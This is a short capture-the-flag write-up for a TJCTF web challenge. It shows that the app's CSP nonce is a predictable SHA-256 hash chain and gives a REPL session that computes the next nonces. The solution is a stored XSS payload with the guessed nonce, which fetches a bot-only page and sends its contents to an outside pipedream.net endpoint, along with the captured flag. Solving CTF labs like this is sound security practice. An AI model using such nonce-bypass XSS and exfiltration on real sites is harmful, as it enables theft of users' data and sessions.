# Solution

The nonce just be updated from default value each time we request to server:

```js
req.locals.nonce = req.locals.nonce ?? '47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d';
req.locals.nonce = crypto.createHash('sha256').update(req.locals.nonce).digest('hex');
```
So we can easily guess the value of the nonce:
```js
> const crypto = require('crypto');
undefined
> crypto.createHash('sha256').update("47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d").digest('hex');
'34dce4583c235ebfa8e06020ae7f81ccc0007b05baf6cca9c03ae07930c64b4f'
> crypto.createHash('sha256').update("34dce4583c235ebfa8e06020ae7f81ccc0007b05baf6cca9c03ae07930c64b4f").digest('hex');
'f8c5a82d13fc3dd49597d4d292ab08f98c3a7845eb7268213ec6a0168fe3ce11'
> crypto.createHash('sha256').update("").digest('hex');
'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
> crypto.createHash('sha256').update("f8c5a82d13fc3dd49597d4d292ab08f98c3a7845eb7268213ec6a0168fe3ce11").digest('hex');
'6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36'
```

Create a note with this content and then send it to the bot:

```js
<script nonce="6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36">fetch(`https://yolo.tjc.tf/do`).then(function(r){return r.text()}).then(function(r){location.href=`https://eov5gzrmq5p9826.m.pipedream.net/?flag=`+encodeURIComponent(r)});</script>
//tjctf{y0u_0n1y_1iv3_0nc3_5ab61b33}
```